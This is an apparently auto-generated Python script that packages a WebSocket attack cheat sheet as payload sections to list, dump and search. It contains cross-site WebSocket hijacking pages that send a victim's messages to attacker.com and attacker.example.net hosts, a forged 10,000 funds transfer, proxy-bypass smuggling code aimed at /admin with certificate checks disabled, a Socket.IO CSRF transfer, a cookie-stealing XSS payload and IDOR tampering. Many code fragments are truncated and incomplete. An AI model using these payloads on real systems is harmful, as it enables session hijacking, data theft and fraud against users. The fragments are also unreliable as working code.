#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/websocket-security

Skill: SKILL: WebSocket Security
Desc : >-

Run:  python hack-skills-websocket-security.py --help
      python hack-skills-websocket-security.py --list
      python hack-skills-websocket-security.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/websocket-security'
TITLE = 'SKILL: WebSocket Security'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: websocket-security", "description: >-", "WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs."],
    'skill-websocket-security': [],
    '0-quick-start': ["During proxy or raw traffic review, watch for:", "```http", "Upgrade: websocket", "Connection: Upgrade", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==", "Sec-WebSocket-Version: 13", "Sec-WebSocket-Protocol: optional-subprotocol", "Server success response indicators:", "```http", "HTTP/1.1 101 Switching Protocols", "Upgrade: websocket", "Connection: Upgrade", "Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=", "**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`."],
    '1-protocol-basics': [],
    'client-request-typical': ["- **`Upgrade: websocket`** and **`Connection: Upgrade`** \u2014 required upgrade handshake.", "- **`Sec-WebSocket-Key`** \u2014 base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.", "- **`Sec-WebSocket-Version: 13`** \u2014 current standard version for browser interoperability."],
    'server-response': ["- **`HTTP/1.1 101 Switching Protocols`** \u2014 handshake complete; subsequent frames are WebSocket binary/text frames per RFC.", "Minimal conceptual flow:", "```text", "Client: HTTP GET + Upgrade headers", "Server: 101 + Sec-WebSocket-Accept", "Channel: framed messages (text/binary), ping/pong, close"],
    '2-cross-site-websocket-hijacking-cswsh': [],
    'condition': ["- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**", "- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.", "Then a malicious page loaded in the victim\u2019s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**."],
    'proof-of-concept-pattern-laboratory-authorized-target-only': ["```javascript", "const ws = new WebSocket('wss://vulnerable.example.com/messages');", "ws.onopen = () => { ws.send('HELLO'); };", "ws.onmessage = (event) => {", "fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));", "**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required\u2014missing checks increase CSWSH risk."],
    '3-testing-with-tools': [],
    'wsrepl': ["```bash", "pip install wsrepl", "wsrepl -u wss://target.example.com/ws -P auth_plugin.py", "Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle."],
    'ws-harness-bridge-to-http-for-other-tools': ["```bash", "python ws-harness.py -u \"ws://127.0.0.1:8765/path\" -m ./message.txt", "Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):", "```bash", "sqlmap -u \"http://127.0.0.1:8000/?fuzz=test\" --batch"],
    'burp-suite-ecosystem': ["- **SocketSleuth** \u2014 inspect and manipulate WebSocket traffic inside Burp.", "- **WebSocket Turbo Intruder** \u2014 high-rate or scripted message fuzzing."],
    '4-common-vulnerabilities': ["Example sensitive URL anti-pattern:", "```text", "wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints."],
    '5-decision-tree': ["1. **Identify endpoint** \u2014 From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.", "2. **Handshake review** \u2014 Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?", "3. **Session binding** \u2014 Reconnect with **another user\u2019s** cookie jar in Burp; compare subscription topics and data leakage.", "4. **CSWSH** \u2014 Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.", "5. **Message semantics** \u2014 Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.", "6. **Transport** \u2014 Flag **`ws://`** in production; verify TLS and HSTS alignment."],
    '6-related-routing': ["- From **[api-sec](../api-sec/SKILL.md)** \u2014 authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.", "**Note**: WebSocket often shares session and permission models with REST; use `api-sec` to align authentication and resource boundaries on the same backend."],
    '7-cswsh-step-by-step-exploitation': [],
    'step-1-confirm-no-origin-check-on-ws-handshake': ["```text"],
    'in-burp-intercept-the-websocket-upgrade-request': [],
    'change-origin-header-to-https-attacker-com': [],
    'if-101-switching-protocols-returned-no-origin-validation': [],
    'if-403-rejected-origin-is-checked-test-subdomain-variants': [],
    'step-2-craft-attacker-page': ["```html", "<html>", "<body>", "<script>", "const ws = new WebSocket('wss://target.com/ws');", "ws.onopen = function() {", "// Connection established as victim (cookies sent automatically)", "console.log('Connected as victim');", "// Send commands as victim", "ws.send(JSON.stringify({action: 'get_profile'}));", "ws.send(JSON.stringify({action: 'list_messages'}));", "ws.onmessage = function(event) {", "// Exfiltrate all received messages", "fetch('https://attacker.com/collect', {", "method: 'POST',", "body: event.data", "ws.onerror = function(err) {", "fetch('https://attacker.com/error?e=' + encodeURIComponent(err));", "</script>", "</body>", "</html>"],
    'step-3-cookies-and-session-hijacking': ["```text", "Browser behavior for WebSocket:", "- Cookies for the target domain ARE sent automatically in the upgrade request", "- SameSite=None cookies always sent", "- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)", "- SameSite=Strict cookies: NOT sent", "Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?", "\u2192 Legacy cookies default to Lax in modern Chrome but None in older browsers"],
    'step-4-read-write-messages-as-victim': ["```javascript", "// Attacker can both READ and WRITE on the WebSocket", "// Read: financial data, private messages, admin commands", "// Write: transfer funds, change settings, send messages as victim", "ws.onopen = () => {", "// Write: perform actions as victim", "ws.send(JSON.stringify({", "action: 'transfer',", "to: 'attacker_account',", "amount: 10000", "ws.onmessage = (e) => {", "const data = JSON.parse(e.data);", "if (data.type === 'balance') {", "// Read: exfiltrate sensitive data", "navigator.sendBeacon('https://attacker.com/data',", "JSON.stringify(data));"],
    '8-websocket-smuggling': [],
    'concept': ["Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection."],
    'upgrade-based-proxy-bypass': ["```text", "1. Reverse proxy restricts access to /admin (returns 403)", "2. Client sends legitimate WebSocket upgrade to /ws", "3. Proxy allows the upgrade (101 response)", "4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)", "5. Client sends raw HTTP request through the \"WebSocket\" connection:", "GET /admin HTTP/1.1", "Host: backend-server", "6. Backend processes the HTTP request \u2192 200 OK with admin content"],
    'h2-over-websocket-smuggling': ["```text", "1. Connect to target via WebSocket", "2. After upgrade, send HTTP/2 preface through the WebSocket tunnel", "3. Backend HTTP/2 handler processes the smuggled requests", "4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic"],
    'implementation-with-python': ["```python", "import websocket", "import ssl", "ws = websocket.create_connection(", "'wss://target.com/ws',", "header=['Origin: https://target.com'],", "sslopt={\"cert_reqs\": ssl.CERT_NONE}"],
    'after-upgrade-send-raw-http-through-the-tunnel': ["smuggled_request = (", "b\"GET /admin/users HTTP/1.1\\r\\n\"", "b\"Host: internal-backend\\r\\n\"", "b\"Connection: close\\r\\n\\r\\n\"", "ws.send(smuggled_request, opcode=0x2)  # binary frame", "response = ws.recv()", "print(response)"],
    'proxy-specific-behaviors': [],
    '9-socket-io-specific-vulnerabilities': [],
    'namespace-injection': ["Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:", "```javascript", "// Client connects to privileged namespace without auth check", "const adminSocket = io('https://target.com/admin');", "adminSocket.on('connect', () => {", "adminSocket.emit('list_users');", "// Server may not verify that the client is authorized for /admin namespace"],
    'event-name-injection': ["If event names are derived from user input:", "```javascript", "// Server-side vulnerable pattern:", "socket.on(userInput, handler);", "// Attacker sends event name that matches internal event:", "socket.emit('__disconnect');     // force disconnect other clients", "socket.emit('connection');        // re-trigger connection handler", "socket.emit('error');             // trigger error handler"],
    'acknowledgement-callback-abuse': ["Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:", "```javascript", "socket.emit('get_data', {id: 'admin'}, (response) => {", "// response may contain data the client shouldn't have access to", "fetch('https://attacker.com/exfil', {", "method: 'POST',", "body: JSON.stringify(response)"],
    'polling-fallback-csrf': ["Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies \u2192 susceptible to CSRF if no additional token verification:", "```text", "POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID", "Content-Type: application/octet-stream", "4{\"type\":2,\"data\":[\"transfer\",{\"to\":\"attacker\",\"amount\":1000}]}"],
    '10-websocket-message-injection': [],
    'in-intercepted-connections-mitm-on-ws': ["If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:", "```text", "1. ARP spoofing or network position to intercept traffic", "2. Identify WebSocket frames in TCP stream", "3. Inject crafted frames between legitimate messages", "4. Both client\u2192server and server\u2192client injection possible"],
    'application-level-injection': ["When WebSocket messages are concatenated or interpolated without sanitization:", "```javascript", "// Vulnerable server-side handler:", "socket.on('chat', (msg) => {", "// If msg contains JSON metacharacters:", "broadcast(`{\"user\":\"${username}\",\"msg\":\"${msg}\"}`);", "// Injection: msg = '\",\"admin\":true,\"msg\":\"hacked'", "// Result: {\"user\":\"attacker\",\"msg\":\"\",\"admin\":true,\"msg\":\"hacked\"}"],
    'stored-xss-via-websocket': ["```text", "1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>", "2. Server stores message and broadcasts to all connected clients", "3. If client renders message as HTML \u2192 stored XSS", "4. All connected users affected simultaneously"],
    '11-binary-websocket-message-manipulation': [],
    'protobuf-deserialization': ["Applications using Protocol Buffers over WebSocket may be vulnerable to:", "```text", "1. Capture binary WebSocket frame", "2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)", "3. Modify field values (e.g., change user_id, amount, role)", "4. Re-encode and send modified frame", "5. Server deserializes without re-validating field constraints", "```bash"],
    'decode-captured-binary-frame': ["echo \"CAPTURED_HEX\" | xxd -r -p | protoc --decode_raw"],
    'output-field-structure-with-types-and-values': [],
    'modify-re-encode-send-back-through-websocket': [],
    'messagepack-deserialization': ["```python", "import msgpack", "import websocket", "ws = websocket.create_connection('wss://target.com/ws')"],
    'decode-received-binary-message': ["raw = ws.recv()", "data = msgpack.unpackb(raw, raw=False)"],
    'data-action-get-balance-user-id-123': [],
    'modify-and-re-send': ["data['user_id'] = 1  # IDOR: access admin's balance", "ws.send(msgpack.packb(data), opcode=0x2)"],
    'type-confusion-attacks': ["Binary serialization formats may allow type confusion:", "```text"],
    'original-user-id-as-integer-field-type-0': [],
    'modified-user-id-as-string-1-or-1-1-field-type-2': [],
    'if-server-doesn-t-validate-types-after-deserialization-sql-injection': [],
    'original-is-admin-as-boolean-false-0x00': [],
    'modified-is-admin-as-boolean-true-0x01': [],
    'direct-privilege-escalation-if-server-trusts-deserialized-values': [],
    'tools-for-binary-websocket-analysis': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()